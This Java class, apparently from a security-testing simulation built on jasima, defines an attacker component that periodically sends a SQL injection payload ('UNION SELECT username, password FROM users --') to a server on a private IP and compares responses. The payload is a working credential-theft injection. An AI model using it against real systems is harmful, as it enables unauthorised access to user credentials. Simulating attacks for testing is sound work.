import static jasima.core.simulation.SimContext.toSimTime;
import static jasima.core.simulation.SimContext.waitFor;
import static java.time.temporal.ChronoUnit.MINUTES;

import java.io.IOException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

import jasima.core.simulation.SimProcess.MightBlock;

public class SqlInjectionAttacker extends SimEntity {

	// component parameters, configurable via CTTP model
	private String serverUrl = "http://192.168.2.3/service?query=123";
	private String serverUrlExploit = "http://192.168.2.3/service?query=123' UNION SELECT username, password FROM users --";
	private int attackDelayInMinutes = 5;

	@Override
	public void lifecycle() throws MightBlock {
		try {
			boolean success;
			do {
				waitFor(toSimTime(getAttackDelayInMinutes(), MINUTES));
				success = tryAttack();
			} while (!success);
		} catch (IOException io) {
			throw new RuntimeException(io);
		}
	}

	private boolean tryAttack() throws IOException {
		// start attack: get response using normal and attack urls
		String contents1 = readStringFromURL(getServerUrl());
		String contents2 = readStringFromURL(getServerUrlExploit());

		// check results if we succeeded and report results
		boolean success = wasAttackSuccessful(contents1, contents2);
		sendAttackResultToBroker("/simulation/SqlInjectionAttacker/attackSuccessful", success);
		return success;
	}

	private void sendAttackResultToBroker(String queue, boolean attackSuccessful) {
		// TODO implement
	}

	private boolean wasAttackSuccessful(String contents1, String contents2) {
		return contents1.equals(contents2);
	}

	private static String readStringFromURL(String requestURL) throws IOException {
		try (Scanner scanner = new Scanner(new URL(requestURL).openStream(), StandardCharsets.UTF_8.toString())) {
			scanner.useDelimiter("\\A");
			return scanner.hasNext() ? scanner.next() : "";
		}
	}

	public int getAttackDelayInMinutes() {
		return attackDelayInMinutes;
	}

	public void setAttackDelayInMinutes(int attackDelayInMinutes) {
		this.attackDelayInMinutes = attackDelayInMinutes;
	}

	public String getServerUrlExploit() {
		return serverUrlExploit;
	}

	public void setServerUrlExploit(String serverUrlExploit) {
		this.serverUrlExploit = serverUrlExploit;
	}

	public String getServerUrl() {
		return serverUrl;
	}

	public void setServerUrl(String serverUrl) {
		this.serverUrl = serverUrl;
	}

}
